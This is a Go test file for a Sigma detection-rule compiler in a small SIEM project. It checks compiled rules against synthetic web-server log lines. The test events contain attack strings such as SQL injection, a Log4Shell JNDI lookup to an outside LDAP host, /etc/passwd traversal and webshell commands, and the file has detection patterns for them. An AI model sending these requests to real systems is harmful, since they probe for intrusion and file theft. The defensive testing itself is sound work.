package sigma

import (
	"errors"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/roywenangr/mini-siem/internal/event"
	"github.com/roywenangr/mini-siem/internal/parser"
	"github.com/roywenangr/mini-siem/internal/rules"
)

var now = time.Date(2026, 10, 5, 12, 0, 0, 0, time.UTC)

func compile(t *testing.T, y string) *rules.Rule {
	t.Helper()
	doc, err := Parse([]byte(y))
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	r, err := Compile(doc, Options{})
	if err != nil {
		t.Fatalf("Compile: %v", err)
	}
	return r
}

func web(t *testing.T, req string, status int, ua string) *event.Event {
	t.Helper()
	line := `203.0.113.7 - - [05/Oct/2026:12:00:00 +0000] "` + req + `" ` + itoa(status) + ` 100 "-" "` + ua + `"`
	ev, err := parser.Nginx{}.Parse(line, now)
	if err != nil {
		t.Fatal(err)
	}
	return ev
}

func itoa(n int) string {
	b := []byte{byte('0' + n/100), byte('0' + n/10%10), byte('0' + n%10)}
	return string(b)
}

const sqliRule = `
title: SQL Injection Strings In URI
id: 11111111-2222-3333-4444-555555555555
status: test
level: high
tags: [attack.initial-access, attack.t1190]
references: [https://example.com/ref, "javascript:alert(1)"]
logsource:
  category: webserver
detection:
  selection:
    cs-method: GET
  keywords:
    - 'union select'
    - 'union%20select'
    - "'1'='1"
  filter_main_status:
    sc-status: 404
  condition: selection and keywords and not 1 of filter_main_*
`

func TestKeywordsSelectionsAndFilter(t *testing.T) {
	r := compile(t, sqliRule)
	if r.ID != "sigma-11111111-2222-3333-4444-555555555555" || r.Severity != "high" || r.Origin != "sigma" {
		t.Fatalf("unexpected rule %+v", r)
	}
	if len(r.References) != 1 {
		t.Errorf("non-http references must be dropped: %v", r.References)
	}
	cases := []struct {
		ev   *event.Event
		want bool
	}{
		{web(t, "GET /items?id=1%20UNION%20SELECT%20pw HTTP/1.1", 200, "x"), true},                 // case-insensitive
		{web(t, "GET /items?id=1%20union%20select%20pw HTTP/1.1", 404, "x"), false},                // filtered by status
		{web(t, "POST /items?id=1%20union%20select%20pw HTTP/1.1", 200, "x"), false},               // wrong method
		{web(t, "GET /items?id=1 HTTP/1.1", 200, "x"), false},                                      // no keyword
		{web(t, "GET / HTTP/1.1", 200, "sqlmap '1'='1"), true},                                     // keyword in user agent
		{&event.Event{Source: "ssh", Message: "union select", Fields: map[string]string{}}, false}, // other source
	}
	for i, c := range cases {
		if got := r.Predicate(c.ev); got != c.want {
			t.Errorf("case %d: got %v, want %v", i, got, c.want)
		}
	}
}

func TestModifiersAndWildcards(t *testing.T) {
	r := compile(t, `
title: Mods
level: medium
logsource: {category: webserver}
detection:
  sel_ua:
    cs-user-agent|startswith: ['nikto', 'Mozilla/5.0 (*) zgrab']
  sel_path:
    cs-uri-stem|endswith: '.php'
    cs-uri-query|contains|all: ['cmd=', 'exec']
  sel_status:
    sc-status|gte: 500
  sel_ip:
    c-ip|cidr: 198.51.100.0/24
  sel_re:
    cs-uri-query|re: '(?i)\$\{jndi:'
  condition: 1 of sel_ua or sel_path or (sel_status and not sel_ip) or sel_re
`)
	check := func(name string, ev *event.Event, want bool) {
		t.Helper()
		if got := r.Predicate(ev); got != want {
			t.Errorf("%s: got %v, want %v", name, got, want)
		}
	}
	check("startswith ci", web(t, "GET / HTTP/1.1", 200, "Nikto/2.5"), true)
	check("wildcard", web(t, "GET / HTTP/1.1", 200, "Mozilla/5.0 (compatible) zgrab/0.x"), true)
	check("wildcard anchored", web(t, "GET / HTTP/1.1", 200, "x Mozilla/5.0 (a) zgrab"), false)
	check("contains all", web(t, "GET /shell.php?cmd=exec HTTP/1.1", 200, "x"), true)
	check("contains all missing one", web(t, "GET /shell.php?cmd=ls HTTP/1.1", 200, "x"), false)
	check("endswith", web(t, "GET /shell.asp?cmd=exec HTTP/1.1", 200, "x"), false)
	check("gte", web(t, "GET / HTTP/1.1", 503, "x"), true)
	check("regex", web(t, "GET /?q=${JNDI:ldap://x} HTTP/1.1", 200, "x"), true)

	ev := web(t, "GET / HTTP/1.1", 503, "x")
	ev.SrcIP = "198.51.100.4"
	check("cidr filter", ev, false)
}

func TestNullExistsAndListOfMaps(t *testing.T) {
	r := compile(t, `
title: Nulls
level: low
logsource: {category: webserver}
detection:
  empty_ua:
    cs-user-agent: null
  odd:
    - cs-method: TRACE
    - cs-method: DEBUG
      sc-status: 200
  has_ref:
    cs-referer|exists: true
  condition: empty_ua or odd or has_ref
`)
	if !r.Predicate(web(t, "GET / HTTP/1.1", 200, "-")) {
		t.Error("missing user agent should match null")
	}
	if !r.Predicate(web(t, "TRACE / HTTP/1.1", 200, "x")) {
		t.Error("list of maps: first alternative")
	}
	if r.Predicate(web(t, "DEBUG / HTTP/1.1", 404, "x")) {
		t.Error("list of maps: second alternative needs both fields")
	}
	ev := web(t, "GET / HTTP/1.1", 200, "x")
	ev.Fields["referer"] = "https://a"
	if !r.Predicate(ev) {
		t.Error("exists")
	}
}

func TestURIQueryChecksQueryAndFullPath(t *testing.T) {
	r := compile(t, `
title: Query
level: low
logsource: {category: webserver}
detection:
  webshell:
    cs-uri-query|startswith: 'cmd='
  traversal:
    cs-uri-query|contains: '/cgi-bin/.%2e/'
  condition: webshell or traversal
`)
	if !r.Predicate(web(t, "GET /shell.jsp?cmd=id HTTP/1.1", 200, "x")) {
		t.Error("query-only semantics")
	}
	if !r.Predicate(web(t, "GET /cgi-bin/.%2e/.%2e/etc/passwd HTTP/1.1", 200, "x")) {
		t.Error("full-URI semantics")
	}
	if r.Predicate(web(t, "GET /cmd=id HTTP/1.1", 200, "x")) {
		t.Error("startswith must not match the path's start")
	}
}

func TestSSHKeywords(t *testing.T) {
	r := compile(t, `
title: Suspicious sshd error
level: medium
logsource: {product: linux, service: sshd}
detection:
  keywords:
    - 'Corrupted MAC on input'
    - 'bad client public DH value'
  condition: keywords
`)
	ev := &event.Event{Source: "ssh", Message: "error: Corrupted MAC on input. [preauth]"}
	if !r.Predicate(ev) {
		t.Error("keyword not matched")
	}
}

func TestUnsupported(t *testing.T) {
	cases := map[string]string{
		"logsource":                `{title: x, level: low, logsource: {product: windows, service: security}, detection: {s: {EventID: 4625}, condition: s}}`,
		"aggregation in condition": `{title: x, level: low, logsource: {category: webserver}, detection: {s: {sc-status: 401}, condition: "s | count() by c-ip > 10"}}`,
		"modifier base64offset":    `{title: x, level: low, logsource: {category: webserver}, detection: {s: {cs-uri-query|base64offset|contains: abc}, condition: s}}`,
		"unmapped field cs-host":   `{title: x, level: low, logsource: {category: webserver}, detection: {s: {cs-host: a}, condition: s}}`,
		"regex syntax":             `{title: x, level: low, logsource: {category: webserver}, detection: {s: {c-uri|re: '(?!a)b'}, condition: s}}`,
		"status deprecated":        `{title: x, status: deprecated, level: low, logsource: {category: webserver}, detection: {s: {cs-method: GET}, condition: s}}`,
	}
	for reason, y := range cases {
		doc, err := Parse([]byte(y))
		if err != nil {
			t.Fatalf("%s: parse: %v", reason, err)
		}
		_, err = Compile(doc, Options{})
		var un *UnsupportedError
		if !errors.As(err, &un) || un.Reason != reason {
			t.Errorf("%s: got %v", reason, err)
		}
	}

	bad := []string{
		`{title: x, level: low, logsource: {category: webserver}, detection: {s: {cs-method: GET}, condition: "s and nope"}}`,
		`{title: x, level: low, logsource: {category: webserver}, detection: {s: {cs-method: GET}, condition: "(s"}}`,
		`{title: x, level: urgent, logsource: {category: webserver}, detection: {s: {cs-method: GET}, condition: s}}`,
		`{title: x, level: low, logsource: {category: webserver}, detection: {s: {cs-method: GET}}}`,
	}
	for _, y := range bad {
		doc, _ := Parse([]byte(y))
		if _, err := Compile(doc, Options{}); err == nil {
			t.Errorf("expected error for %s", y)
		}
	}
	if _, err := Parse([]byte("title: a\n---\ntitle: b\n")); err == nil {
		t.Error("multi-document should be rejected")
	}
}

func TestLoadPathsAndEngine(t *testing.T) {
	dir := t.TempDir()
	write := func(name, body string) {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	write("sqli.yml", sqliRule)
	write("dup.yml", sqliRule)
	write("win.yml", `{title: x, level: low, logsource: {product: windows}, detection: {s: {a: b}, condition: s}}`)
	write("broken.yml", "title: [")
	write("notes.txt", "ignored")

	rs, rep, err := LoadPaths([]string{dir}, Options{DedupWindow: time.Minute})
	if err != nil {
		t.Fatal(err)
	}
	if rep.Files != 4 || rep.Loaded != 1 || rep.Skipped["duplicate id"] != 1 || rep.Skipped["logsource"] != 1 || rep.Skipped["invalid rule"] != 1 {
		t.Fatalf("report %+v", rep)
	}

	eng := rules.NewEngine(rs)
	ev := web(t, "GET /?id=1%20union%20select%201 HTTP/1.1", 200, "x")
	ev.ID = 1
	alerts := eng.Process(ev)
	if len(alerts) != 1 || alerts[0].Description != "203.0.113.7: GET /?id=1%20union%20select%201 HTTP/1.1" {
		t.Fatalf("alerts %+v", alerts)
	}
	ev.Timestamp = ev.Timestamp.Add(30 * time.Second)
	if a := eng.Process(ev); a != nil {
		t.Error("repeat inside dedup window should be suppressed")
	}
}

// TestSigmaHQ compiles the real community rule set when SIGMA_DIR points
// at a checkout of github.com/SigmaHQ/sigma (make sigma does this).
func TestSigmaHQ(t *testing.T) {
	dir := os.Getenv("SIGMA_DIR")
	if dir == "" {
		t.Skip("SIGMA_DIR not set")
	}
	rs, rep, err := LoadPaths([]string{filepath.Join(dir, "rules"), filepath.Join(dir, "rules-emerging-threats")}, Options{})
	if err != nil {
		t.Fatal(err)
	}
	if len(rep.Errors) > 0 {
		t.Errorf("rules failed to compile: %v", rep.Errors)
	}
	if len(rs) < 50 {
		t.Errorf("only %d rules loaded: %+v", len(rs), rep)
	}
	t.Logf("loaded %d of %d files; skipped %v", rep.Loaded, rep.Files, rep.Skipped)

	// Real attack payloads should trip at least one community rule each.
	attacks := []*event.Event{
		web(t, "GET /?x=${jndi:ldap://203.0.113.9/a} HTTP/1.1", 200, "x"),
		web(t, "GET /download?file=../../../../etc/passwd HTTP/1.1", 200, "x"),
		web(t, "GET /search?q=1%27%20UNION%20SELECT%20password%20FROM%20users-- HTTP/1.1", 200, "x"),
		web(t, "GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1", 200, "x"), // CVE-2021-41773
	}
	for i, ev := range attacks {
		hit := false
		for _, r := range rs {
			if r.Predicate(ev) {
				hit = true
				break
			}
		}
		if !hit {
			t.Errorf("attack %d (%s) matched no rule", i, ev.Message)
		}
	}
	benign := web(t, "GET /blog/hello-world HTTP/1.1", 200, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0 Safari/537.36")
	for _, r := range rs {
		if r.Predicate(benign) {
			t.Errorf("benign request matched %s (%s)", r.ID, r.Name)
		}
	}
}
